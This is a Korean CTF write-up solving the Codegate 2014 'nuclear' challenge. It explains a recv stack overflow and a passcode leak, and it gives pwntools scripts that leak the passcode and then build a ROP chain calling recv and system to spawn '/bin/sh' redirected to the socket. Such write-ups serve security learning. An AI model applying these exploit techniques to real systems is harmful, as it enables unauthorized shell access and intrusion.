# 주의 사항

THIS_IS_NOT_KEY_JUST_PASSCODE 라는 파일을 만들어야합니다!

내용은 자유

# Codegate 2014 Nuclear 풀이

문제 요약 : passcode를 leak한 다음 recv를 이용한 Stack buffer overflow를 요구하는 문제



먼저 공격 벡터를 찾아보기로 했다.

sub_8048B9C에 pthread_create에 인자인 start_routine 함수를 보면



![nuclear](https://github.com/34t3rnull/HelloCTF/blob/master/Codegate_2014_nuclear/rsrc/nuclear_0.JPG)



분명히 buf는 524 바이트가 할당되어 있는데,  recv로 할당하는 크기는 0x512 즉 1298 바이트를 할당한다. 이 부분에서 stack overflow가 일어남을 알 수 있다.



근데 한 가지 문제가 있었다.



![nuclear](https://github.com/34t3rnull/HelloCTF/blob/master/Codegate_2014_nuclear/rsrc/nuclear_1.JPG)



launch를 하면 passcode를 입력해아하는데, 이 passcode는 THIS_IS_NOT_KEY_JUST_PASSCODE라는 파일을 읽어서 저장된 값이다.  근데 이 파일은 내가 만들었긴하지만 모른다는 가정하에 PASSCODE를 구하려면 어딘가에서 leak을 해야했다.



![nuclear](https://github.com/34t3rnull/HelloCTF/blob/master/Codegate_2014_nuclear/rsrc/nuclear_2.JPG)



leak 하기 전 스택의 상황을 살펴보니

| result | newthread | str | v4 | v5 | passcode | v7 | *stream|으로 이루어진 것을 알 수 있다.

그리고 위를 바탕으로 leak을 할 수 있는 함수를 찾았더니



![nuclear](https://github.com/34t3rnull/HelloCTF/blob/master/Codegate_2014_nuclear/rsrc/nuclear_3.JPG)



아마 이것이 leak을 위한 함수 같다. 근데 이것만 이용하면 str을 다 채운다고 해도 v4, v5에 가로막혀 passcode의 값을 빼기는 힘들다.

그래서 v4, v5에 있을 NULL을 없애기 위한 방법을 찾아보았다.



![nuclear](https://github.com/34t3rnull/HelloCTF/blob/master/Codegate_2014_nuclear/rsrc/nuclear_4.JPG)

 

target이란 명령어를 입력하면 %f/%f로 v5와 &v4에 값을 채워넣는데 이 부분의 NULL을 없애면 아마 passcode를 leak할 수 있을 듯 하다.



이를 바탕으로 leak하는 함수를 짜보았다.

```python
from pwn import *

r = remote("localhost", 1129)

r.recvuntil("> ")
r.sendline("target")
r.recvuntil("---> ")
r.sendline("123.456798/123.456789") # v4와 v5의 값을 채워줌
r.recvuntil("> ")
r.sendline("A"*516)
r.recv(0x21e) # garbage 값 버리기
passcode = r.recv(1024)
print "[*] passcode : " + passcode
```



이를 실행해보면



![nuclear](https://github.com/34t3rnull/HelloCTF/blob/master/Codegate_2014_nuclear/rsrc/nuclear_5.JPG)



와~ passcode가 passcode였다. ㅋ



이제 launch 메뉴에서 passcode를 입력하고 공격 벡터를 공격하면 되겠다.

먼저 어떤 보호기법이 걸려있나 살펴보기로 한다.



![nuclear](https://github.com/34t3rnull/HelloCTF/blob/master/Codegate_2014_nuclear/rsrc/nuclear_6.JPG)



NX만 걸려있다. 그러면 일단 쉘코드 문제는 아니니깐 ROP를 하면 되겠다.

근데 plt를 구할 때, 나는 ELF를 이용하여 구했는데 이게 제대로 된 값이 아니었다... ㅠㅠ

그래서 어짜피 서버는 계속 똑같은 값을 가지고 있을 것이니깐 디버깅을 통해 함수 주소를 구해온 후  익스를 하기로 했다.



![nuclear](https://github.com/34t3rnull/HelloCTF/blob/master/Codegate_2014_nuclear/rsrc/nuclear_7.JPG)



이젠 그냥 이 주소를 가지고 rop를 때리면??



```python
from pwn import *
import time

binary = "./nuclear"
libc = "/lib/i386-linux-gnu/libc-2.23.so"

#context.log_level = "debug"

r = remote('localhost', 1129)
e = ELF(binary)

#time.sleep(10) # 디버깅을 위한 sleep

ppppr = 0x804917c
bss = e.bss()
recv = 0xf76b3340
system = 0xf7528da0

r.recvuntil("> ")
r.sendline("launch")
r.recvuntil(": ")
r.sendline("passcode")
r.recvuntil("COUNT DOWN : 100")

print "[*] gadget addr : " + hex(ppppr)
print "[*] bss addr : " + hex(bss)
print "[*] recv addr : " + hex(recv)
print "[*] system addr : " + hex(system)

payload = "A" * 528
payload += p32(recv)
payload += p32(ppppr)
payload += p32(4)
payload += p32(bss)
payload += p32(len("/bin/sh 0>&4 1>&4") + 1)
payload += p32(0)

payload += p32(system)
payload += "ABCD"
payload += p32(bss)

r.sendline(payload)
r.recv(1024)
r.sendline("/bin/sh 0>&4 1>&4")  # 그냥 /bin/sh 때리면 서버에서 처리됨
r.recv(1024)
r.interactive()
r.close()
```



이러면??



![nuclear](https://github.com/34t3rnull/HelloCTF/blob/master/Codegate_2014_nuclear/rsrc/nuclear_8.JPG)



성공!!!!
